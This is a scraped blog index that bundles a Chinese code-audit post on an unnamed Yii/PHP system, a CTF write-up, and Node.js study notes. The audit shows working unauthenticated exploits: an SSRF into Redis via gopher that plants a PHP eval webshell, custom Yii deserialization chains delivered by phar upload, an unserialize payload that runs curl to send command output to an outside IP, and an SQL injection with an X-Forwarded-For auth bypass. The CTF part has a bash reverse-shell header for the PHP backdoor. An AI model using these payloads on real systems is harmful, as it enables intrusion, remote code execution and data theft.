","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 前台SSRF本次审计漏洞重点放在前台/未授权上面， 在center/controllers/DemoController.php下，存在一个经典的SSRF漏洞，并且带回显 // php代理 实现get post请求 public function actionProxy(){ $rs = []; if(\\Yii::$app-\u003erequest-\u003eisPost){ $url = \\Yii::$app-\u003erequest-\u003epost('url'); $post_data = \\Yii::$app-\u003erequest-\u003epost(); $rs = $this-\u003epost($url,$post_data); }elseif (\\Yii::$app-\u003erequest-\u003eisGet){ $url = \\Yii::$app-\u003erequest-\u003eget('url'); $rs = $this-\u003eget($url); } return $rs; } // get private function get($url){ //初始化 $ch = curl_init(); //设置选项，包括URL curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //执行并获取HTML文档内容 $output = curl_exec($ch); //释放curl句柄 curl_close($ch); return $output; } // post private function post($url,$post_data){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // post数据 curl_setopt($ch, CURLOPT_POST, 1); // post的变量 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); $output = curl_exec($ch); curl_close($ch); return $output; } 构造请求/demo/proxy?url=file:///etc/passwd 尝试读取redis配置文件/xxxx/etc/system.conf online_server=\"127.0.0.1\" user_server=\"127.0.0.1\" auth_server=\"127.0.0.1\" detail_server=\"127.0.0.1\" log_server=\"127.0.0.1\" dye_server=\"127.0.0.1\" my_ip=\"127.0.0.1\" remote_dm_ip=\"\" thread_num =\"4\" redis_password=\"xxxxxx@redis\" cache_server=\"127.0.0.1\" 通过common/config/main-local.php文件得到redis端口在16xxx-16xxx 选择一个redis端口打一下 import urllib.parse protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"16xxx\" shell=\"\\n\\n\u003c?php eval($_GET[\\\"cmd\\\"]);?\u003e\\n\\n\" filename=\"1.php\" path=\"/tmp\" passwd=\"xxxx@redis\" #如果无密码就不加，如果有密码就加 cmd=[ \"config set dir /tmp\", \"config set dbfilename success\", \"set 'test' 'success'\", \"save\", \"quit\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(urllib.parse.quote(payload)) config命令没有找到，很失败，在配置文件中看到了被禁用 版本是6.2.6也没办法主从复制Orz，但是在远程环境中部分是存在config命令的，从SSRF顺利变成了RCE ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:1","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 未授权任意文件下载由于是Yii框架，所以很快的找到了不做权限验证的api 在center/modules/user/controllers/GroupController.php控制器下， public function actionDownLoad() { //下载文件 if (Yii::$app-\u003erequest-\u003eget('file')) { return Yii::$app-\u003eresponse-\u003esendFile(Yii::$app-\u003erequest-\u003eget('file')); } if (Yii::$app-\u003esession-\u003eget('batch_excel_download_file')) { return Yii::$app-\u003eresponse-\u003esendFile(Yii::$app-\u003esession-\u003eget('batch_excel_download_file')); } else { Yii::$app-\u003egetSession()-\u003esetFlash('error', Yii::t('app', 'batch excel help31')); } return $this-\u003eredirect(['index']); } 跟进查看sendFile() public function sendFile($filePath, $attachmentName = null, $options = []) { if (!isset($options['mimeType'])) { $options['mimeType'] = FileHelper::getMimeTypeByExtension($filePath); } if ($attachmentName === null) { $attachmentName = basename($filePath); } $handle = fopen($filePath, 'rb'); $this-\u003esendStreamAsFile($handle, $attachmentName, $options); return $this; } 利用fopen函数打开了传入的文件路径，无任何过滤，直接读取文件 /user/group/down-load?file=/etc/passwd 但是任意文件下载危害并不大，我们需要以RCE为目的，在这种成熟框架面前，反序列化还是有的，碰巧fopen函数也支持phar://协议可以触发phar反序列化 反序列化挖掘Yii框架是2.0.45，这套系统加了一些vendor，同时也删除了一些Yii自带的vendor，所以只能靠我们自己挖一条链子出来，POC如下 POP Chain 1 \u003c?php namespace yii\\base { class Component { private $_events = array(); private $_behaviors = 1; public function __construct() { include(\"./vendor/opis/closure/autoload.php\"); $func = function(){ $cmd = 'touch /tmp/success'; system($cmd); }; $raw = \\Opis\\Closure\\serialize($func); $data=\\Opis\\Closure\\unserialize($raw); $this-\u003e_events = [\"afterOpen\" =\u003e [[ $data, \"huahua\" ]]]; } } } namespace yii\\redis{ use yii\\base\\Component; class Connection extends Component{ public $redisCommands = []; public $hostname = ''; public $port; public $password; public $username; public $connectionTimeout; public $dataTimeout; public $database; public $unixSocket; private $_socket; public function __construct() { $this-\u003eredisCommands = array('CLEAN UP'); $this-\u003e_socket = false; $this-\u003ehostname = '127.0.0.1'; $this-\u003eport = 8001;//能够连通的任意本地服务的端口 $this-\u003eunixSocket = false; $this-\u003econnectionTimeout = 5; parent::__construct(); } } } namespace setasign\\Fpdi\\PdfReader{ use yii\\redis\\Connection; class PdfReader{ protected $parser; public function __construct(){ $this-\u003eparser = new Connection; } } include(\"./vendor/opis/closure/autoload.php\"); echo urlencode(\\Opis\\Closure\\serialize(new PdfReader)); } ?\u003e POP Chain 2 \u003c?php namespace yii\\rest { class CreateAction { public $id; public $checkAccess; public function __construct() { $this-\u003echeckAccess = 'system'; $this-\u003eid = \"touch /tmp/success\"; } } } namespace yii\\base { use yii\\rest\\CreateAction; class Component { private $_events = array(); private $_behaviors = 1; public function __construct() { $this-\u003e_events = [\"afterOpen\" =\u003e [[ [new CreateAction,\"run\"], \"a\"]]]; } } } namespace yii\\redis{ use yii\\base\\Component; class Connection extends Component{ public $redisCommands = []; public $hostname = ''; public $port; public $password; public $username; public $connectionTimeout; public $dataTimeout; public $database; public $unixSocket; private $_socket; public function __construct() { $this-\u003eredisCommands = array('CLEAN UP'); $this-\u003e_socket = false; $this-\u003ehostname = '127.0.0.1'; $this-\u003eport = 8001;//能够连通的任意本地服务的端口 $this-\u003eunixSocket = false; $this-\u003econnectionTimeout = 5; parent::__construct(); } } } namespace setasign\\Fpdi\\PdfReader{ use yii\\redis\\Connection; class PdfReader{ protected $parser; public $test; public function __construct(){ $this-\u003eparser = new Connection; } } } namespace { use setasign\\Fpdi\\PdfReader\\PdfReader; $clazz = new PdfReader; @unlink(\"test.phar\"); $p = new Phar(\"test.phar\",0); $p-\u003estartBuffering(); $p-\u003esetMetadata($clazz); $p-\u003esetStub(\"GIF89a__HALT_COMPILER();\"); $p-\u003eaddFromString(\"huahua.txt\",\"successful!\"); $p-\u003estopBuffering(); } ?\u003e 上传phar文件在center/modules/report/controllers/SystemController.php控制器下正好存在一个写图片文件的地方 public function actionImageSave() { $post = Yii::$app-\u003erequest-\u003epost(); $picInfo = $post['baseimg']; $savingDir = 'uploads/monitor/'; if (!is_dir($savingDir)) { mkdir($savingDir); } $streamFileRand = $savingDir.$post['sql_type'].$post['proc'].'.png'; //图片名 Yii::$app-\u003esession-\u003eset('filename', $streamFileRand); preg_match('/(?\u003c=base64,)[\\S|\\s]+/',$picInfo,$picInfoW);//处理base64文本 file_put_contents($streamFileRand,base64_decode($picInfoW[0]));//文件写入 return true; } 最终利用step 1 POST /report/system/image-save HTTP/2 baseimg=base64,R0lGODlhX19IQUxUX0NPTVBJTEVSKCk7ID8%2bDQqlAgAAAQAAABEAAAABAAAAAABtAgAATzozMzoic2V0YXNpZ25cRnBkaVxQZGZSZWFkZXJcUGRmUmVhZGVyIjoyOntzOjk6IgAqAHBhcnNlciI7TzoyMDoieWlpXHJlZGlzXENvbm5lY3Rpb24iOjEyOntzOjEzOiJyZWRpc0NvbW1hbmRzIjthOjE6e2k6MDtzOjg6IkNMRUFOIFVQIjt9czo4OiJob3N0bmFtZSI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aTo4MDgxO3M6ODoicGFzc3dvcmQiO047czo4OiJ1c2VybmFtZSI7TjtzOjE3OiJjb25uZWN0aW9uVGltZW91dCI7aTo1O3M6MTE6ImRhdGFUaW1lb3V0IjtOO3M6ODoiZGF0YWJhc2UiO047czoxMDoidW5peFNvY2tldCI7YjowO3M6Mjk6IgB5aWlccmVkaXNcQ29ubmVjdGlvbgBfc29ja2V0IjtiOjA7czoyNzoiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRzIjthOjE6e3M6OToiYWZ0ZXJPcGVuIjthOjE6e2k6MDthOjI6e2k6MDthOjI6e2k6MDtPOjIxOiJ5aWlccmVzdFxDcmVhdGVBY3Rpb24iOjI6e3M6MjoiaWQiO3M6MTg6InRvdWNoIC90bXAvc3VjY2VzcyI7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjt9aToxO3M6MzoicnVuIjt9aToxO3M6MToiYSI7fX19czozMDoiAHlpaVxiYXNlXENvbXBvbmVudABfYmVoYXZpb3JzIjtpOjE7fXM6NDoidGVzdCI7Tjt9CgAAAGh1YWh1YS50eHQLAAAAjT7YZQsAAABYYbEEpAEAAAAAAABzdWNjZXNzZnVsIeJ7cw%2bG4EYC7FkDA58zSu4gzM18AgAAAEdCTUI%3d\u0026sql_type=hua\u0026proc=hua step 2 /user/group/down-load?file=phar://./uploads/monitor/huahua.png 成功利用 ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:2","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 前台无条件RCE既然挖到了两条链子，全局搜索unserialize函数 在center/modules/strategy/controllers/IpController.php控制器下面， 存在两个方法存在unserialize() public function actionBindIp(){ $data1 = unserialize(Yii::$app-\u003erequest-\u003epost('data1')); ... ... ... } public function actionCancelBindIp(){ $data1 = unserialize(Yii::$app-\u003erequest-\u003epost('data1')); ... ... ... } 构造poc POST /strategy/ip/bind-ip data1=O%3A33%3A%22setasign%5CFpdi%5CPdfReader%5CPdfReader%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00parser%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A12%3A%7Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22CLEAN+UP%22%3B%7Ds%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A8001%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22username%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A5%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A10%3A%22unixSocket%22%3Bb%3A0%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A275%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A127%3A%22function%28%29%7B%0A++++++++++++++++%24cmd+%3D+%27curl+http%3A%2F%2F124.220.215.8%3A1234%2F%3Fcmd%3D%60whoami%60%27%3B%0A++++++++++++++++%5Csystem%28%24cmd%29%3B%0A++++++++++++%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A18%3A%22yii%5Cbase%5CComponent%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000053bc12be000000004d2c46e6%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22huahua%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7D%7D 成功RCE ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:3","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" API接口","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 0x00 SQL注入先来看一下如何做的权限验证 'authenticator' =\u003e [ 'class' =\u003e \\common\\extend\\ApiAuth::className(), ], 跟进ApiAuth类 public function authenticate($user, $request, $response) { // 如果是从 v2 过来的，就不要重复验证 if (substr($request-\u003epathInfo, 0, 7) === 'api/v2/') { return true; } $this-\u003eaccess_token = $this-\u003efindParams($request, $this-\u003etokenParam); $url = $this-\u003efindParams($request); $ip = $request-\u003egetUserIP(); $this-\u003evalidateAccessToken($ip, $url); $this-\u003evalidateRemoteAddress($ip, $url); if ($this-\u003evalidateAction($url, $ip)) { return true; } throw new UnauthorizedHttpException(\\Yii::t('app', 204010), 20401); } 先绕过第一个点validateAccessToken public function validateAccessToken($ip, $url) { //去缓存内先验证一下令牌是否有缓存,如果没有则去mysql表内查询 if (!Yii::$app-\u003ecache-\u003eget($this-\u003eaccess_token)) { //如果url是查询令牌接口，则根据请求ip来进查询数据 if ($url == '/api/v8/auth/get-access-token') { //按着ip精准查询 $tokenResource = IpBindingToken::find()-\u003ewhere(['ip' =\u003e $ip])-\u003easArray()-\u003eall(); //如果没查询到数据， 可能是授权的ip段 比如 192.168.1.100-192.168.1.105 if (!$tokenResource) { $tmp_ip = explode('.', $ip); unset($tmp_ip[3]); //根据ip前三位来查询数据 是一个二维数组 $tokenResource = IpBindingToken::find()-\u003efilterWhere(['like', 'ip', implode('.', $tmp_ip)])-\u003easArray()-\u003eall(); } //如果没查询到数据，返回机器未授权 if (!$tokenResource) { throw new UnauthorizedHttpException(Yii::t('app', 204013), 20401); } //如果是多个数组，那么这一步就必须要匹配到ip相对应的数据了 foreach ($tokenResource as $item) { //解析mysql存储的ip列数据，返回boolean $ipParseResult = $this-\u003eparseIp($ip, $item['ip']); //判断用户ip是否在ipMap数组内 if ($ipParseResult) { $this-\u003eaccess_token = $item['token']; Yii::$app-\u003ecache-\u003eadd($this-\u003eaccess_token, $item); break; } } //如果未能匹配到数据， 返回机器未授权错误 if ($this-\u003eaccess_token == $ip) { throw new UnauthorizedHttpException(Yii::t('app', 204013), 20401); } } else { //其他请求均以令牌为查询条件 $tokenResource = IpBindingToken::findOne(['token' =\u003e $this-\u003eaccess_token]); if (!$tokenResource) { //返回令牌错误 throw new UnauthorizedHttpException(Yii::t('app', 204012), 20401); } Yii::$app-\u003ecache-\u003eadd($this-\u003eaccess_token, $tokenResource-\u003eattributes); } } } 接收传入的参数access_token并且和数据库中的作对比，在/api/v8/auth/get-access-token中可以获取token，在请求时加上X-Forwarded-For: 127.0.0.1即可 第二个点validateRemoteAddress，这里没什么好说的，请求时加上X-Forwarded-For: 127.0.0.1和上面的access_token相匹配即可 绕过权限验证后，再来看控制器 rest/versions/api/immu/controllers/QueryController.php public function actionIndex() { $params = Yii::$app-\u003erequest-\u003eget(); $userName = @$params['user_name']; //$findUser = \"select user_name from `user` where user_name='$userName'\"; $findRes = $this-\u003egetUser($userName); if (!$findRes) { return Common::info(10002); } $time = @$params['time']; $timeNow = date('Ym',time()); if ($time == $timeNow){ //查mysql总和加redis在线total //查在线表总流量 $tableName = 'srun_detail'; $sql = \"select `rad_online_id` from `online_radius` where `user_name`='$userName'\"; $details = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); if (!$details){ $onlineBytes = 0; }else{ $hash = Redis::executeCommand('hGetAll', 'hash:rad_online:' . $details['rad_online_id'], [], 'redis_online'); if ($hash) { $onlineData = Redis::hashToArray($hash); $onlineBytes = $onlineData['bytes_in'] + $onlineData['bytes_out']; }else{ $onlineBytes = 0; } } }else{ $tableName = sprintf('srun_detail%s%s',\"_\",$time); $onlineBytes = 0; } $sql = \"select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`='$userName'\"; $mysqlData = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); $allBytes = $mysqlData['mysql_bytes']; $allBytes = $allBytes + $onlineBytes; $result['total_bytes'] = sprintf(\"%.2f\",$allBytes/(1024**3)); $result['code'] = 'E00'; $result['msg'] = '成功'; return $result; } 在这里，直接做了拼接并且执行 $sql = \"select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`='$userName'\"; $mysqlData = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); 构造payload GET /api/immu/query?access_token=FPFBWAk5llPf3Phd5drTiez9Uks1749J\u0026user_name=test002\u0026time=mobile_day`+where+user_name='test001'+union+select+1+and(select+sleep(3))%23 HTTP/2 Host: 192.168.0.105:8001 X-Forwarded-For: 127.0.0.1 ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:1","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["比赛记录"],"content":" 门酱想玩什么呢？右键源代码发现nssctfroundSpring.php \u003c?php highlight_file(__FILE__); //部分关键代码 $contentLines = explode(\" \", $comment['content']); if (preg_match('/^https?:\\/\\/\\S+$/', $contentLines[0])) { if (preg_match('/^https?:\\/\\/[^\\/]+\\/\\S+\\.png$/', $contentLines[0], $matches) \u0026\u0026 end($contentLines) === '/png') { $urlParts = parse_url($matches[0]); if ($urlParts !== false) { echo '\u003cimg class=\"content\" src=\"' . $matches[0] . '\"\u003e'; //....... } //...... } //...... } 很明显存在xss 通过查看评论区得知需要在门酱处访问元梦之星官网的url，在发表评论处正是上面得到的代码，于是利用 xss 还需要绕过CSP Content-Security-Policy: script-src 'self' 'unsafe-inline'; 利用window.location 构造poc https://\"\u003e\u003cscript\u003ewindow.location=\"https://ymzx.qq.com/\"\u003c/script\u003e.png /png 得到 http://node2.anna.nssctf.cn:28764/words/?title=MQ==\u0026content=aHR0cHMlM0ElMkYlMkYlMjIlM0UlM0NzY3JpcHQlM0V3aW5kb3cubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFLnBuZyUyMCUyRnBuZw== 在门酱处插入得到flag ","date":"2024-02-14","objectID":"/nssctf-round-18-basic/:1:0","tags":["CTF-Web"],"title":"NSSCTF Round 18 Basic","uri":"/nssctf-round-18-basic/"},{"categories":["比赛记录"],"content":" Becomeroot8.1.0-dev后门漏洞 GET / HTTP/1.1 Host: node1.anna.nssctf.cn:28073 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 User-Agentt: zerodiumsystem(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/vps/port 0\u003e\u00261'\"); Connection: close 利用工具进行扫描提权漏洞 https://github.com/The-Z-Labs/linux-exploit-suggester 利用CVE-2021-3156提权 https://github.com/Rvn0xsy/CVE-2021-3156-plus?tab=readme-ov-file ","date":"2024-02-14","objectID":"/nssctf-round-18-basic/:2:0","tags":["CTF-Web"],"title":"NSSCTF Round 18 Basic","uri":"/nssctf-round-18-basic/"},{"categories":["开发"],"content":" NodejsNodejs是一个基于 Chrome V8 引擎解析 JavaScript ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" fs 文件系统模块 const fs = require(\"fs\") fs.readFile(path[,options],callback) //读取文件 // 文件路径 // 以什么编码格式读取文件 // 文件读取完成后，通过回调函数拿到读取的结果 fs.writeFile(file,data[,options],callback) //向指定的文件写入内容 // 文件路径 // 写入的内容 // 以什么格式写入 // 文件写入完成后的回调函数 读取文件 const fs = require(\"fs\") fs.readFile(\"./test.txt\",\"utf8\",function(err,dataStr){ console.log(err) console.log(\"------\") console.log(dataStr) }) 写入文件 const fs = require(\"fs\") fs.writeFile(\"test.txt\",\"Hello World\",\"utf8\",function(err){ console.log(err) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" path路径模块path 模块是用来提供处理路径的模块。 path.join()方法，用来将多个路径片段拼接成一个完整的路径字符串 path.basename()方法，用来从路径字符串中，将文件名解析出来 const path = require(\"path\"); path.join([...paths]) // 路径 path.basename(path[,ext]) // 文件路径 path.extname()获取路径中的扩展名部分 path.extname(path) // 文件路径 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" http模块创建 web 服务器的模块 const http = require('http') const server = http.createServer(); //使用服务器实例的 .on() 方法，为服务器绑定一个 request 事件 server.on('request',(req,res) =\u003e{ //req 请求对象 //req.url 是客户端请求的 URL 地址 //req.method 是客户端的 method 请求类型 //只要有客户端请求服务器，就会触发request事件，从而调用这个处理函数 //res 响应对象 const str = \"Hello World\" //向客户端响应内容 res.end(str) console.log(\"Someone visit our web server .\") }) server.listen(9091,()=\u003e{ console.log('http server running at http://127.0.0.1:9091') }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 模块化内置模块、自定义模块、第三方模块 // 加载内置模块 const fs = require(\"fs\") // 加载用户的自定义模块 const custom = require(\"./common.js\") // 加载第三方模块 const moment = require(\"moment\") ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 向外共享模块作用域中的成员module 对象 console.log(module) { id: '.', path: '/Users/f10wers13eicheng/Desktop/node-project', exports: {}, filename: '/Users/f10wers13eicheng/Desktop/node-project/index.js', loaded: false, children: [], paths: [ '/Users/f10wers13eicheng/Desktop/node-project/node_modules', '/Users/f10wers13eicheng/Desktop/node_modules', '/Users/f10wers13eicheng/node_modules', '/Users/node_modules', '/node_modules' ] } module.exports对象 可以将模块内的成员共享出去，供外界使用 module.exports.username = 'zs' module.exports.sayHello = function(){ console.log(\"Hello\") } 使用require()方法导入模块时，导入的结果，永远以module.exports指向的对象为准 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:1","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" npm与包https://www.npmjs.cn/ npm install 包的完整名称 初次装包完整后，在项目文件夹多一个叫做 node_modules的文件夹和package_locak.json的配置文件 npm i moment@2.22.2 安装指定的版本 包管理配置文件npm规定，在项目跟目录中，必须提供一个叫做 package.json的包管理配置文件。用来记录与项目有关的一些配置信息 快速创建package.json npm init -y npm install 会读取package.json文件进行下载 npm config get registry 查看当前的下包镜像源 包的分类指定-g 安装为全局包 不指定则为 项目包 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:2","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 模块的加载机制优先从缓存中加载 内置模块加载优先级最高 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:6:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" ExpressExpress 是基于 nodejs 平台，快速、开发、极简的 Web 开发框架 npm i express@4.17.1 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 创建基本的 Web 服务器 const express = require(\"express\") // 创建 web 服务器 const app = express() app.listen(9091,()=\u003e{ console.log(\"express server running at http://127.0.0.1:9091\") }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:1","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 监听 GET/POST 请求app.get()/app.post()方法，可以监听客户端 GET/POST 请求 app.get('请求URL',function(req)) //客户端请求的 URL 地址 // 请求对应的处理函数 // req: 请求对象 // res: 响应对象 app.get(\"/welcome\",(req,res)=\u003e{ res.send(\"Hello World\") }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:2","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 获取 URL 中携带的查询参数通过req.query对象，可以放问到客户端通过查询字符串的形式，发送到服务器的参数 app.get('/',(req.res)=\u003e{ // req.query 默认是一个空对象 // 客户端使用?name=zs\u0026age=20 // 可以通过 req.query 对象访问到 // req.query.name req.query.age console.log(req.query) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:3","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 获取 URL 中的动态参数通过req.params对象，可以访问到 URL 中，通过:匹配到的动态参数 app.get('/user/:id',(req,res)=\u003e{ //req.params 里面存放着通过:动态匹配到的参数值 console.log(req.params) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:4","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 托管静态资源express.static() express提供了一个static()函数，创建一个静态资源服务器 例如，通过如下代码可以将public目录下的图片、css 文件、js 文件对外开放访问了 app.use(express.static('public')) 挂载路径前缀如果希望托管在静态资源访问路径之前，挂载路径前缀 app.use('/public',express.static('public')) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:5","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" nodemon使用npm install -h nodemon 能够实时监听代码修改 